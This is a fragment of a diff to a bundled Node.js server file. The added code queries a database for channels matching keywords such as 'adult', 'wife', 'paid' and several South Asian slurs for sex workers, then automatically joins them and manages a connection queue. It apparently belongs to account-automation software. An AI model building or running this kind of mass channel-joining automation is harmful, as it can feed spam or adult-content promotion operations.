+      const channels = await client.channelInfo(true);
+      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];
+      const result = await db.getActiveChannels(150, 0, keys, channels.ids, "channels");
+      console.log("DbChannelsLen: ", result.length);
+      let resp = '';
+      for (const channel of result) {
+
+        resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
+      }
+      client.joinChannels(resp);
+    }
+  }
+}
+
+function pushToconnectionQueue(userName, processId) {
+  const existingIndex = connetionQueue.findIndex(entry => entry.userName === userName);
+  if (existingIndex !== -1) {
+    connetionQueue[existingIndex].processId = processId;
+  } else {
+    connetionQueue.push({ userName, processId });
+  }
+}
+
+})();
+
+var __webpack_export_target__ = exports;
+for(var i in __webpack_exports__) __webpack_export_target__[i] = __webpack_exports__[i];
+if(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", { value: true });
+/******/ })()
+;
 //# sourceMappingURL=server.js.map
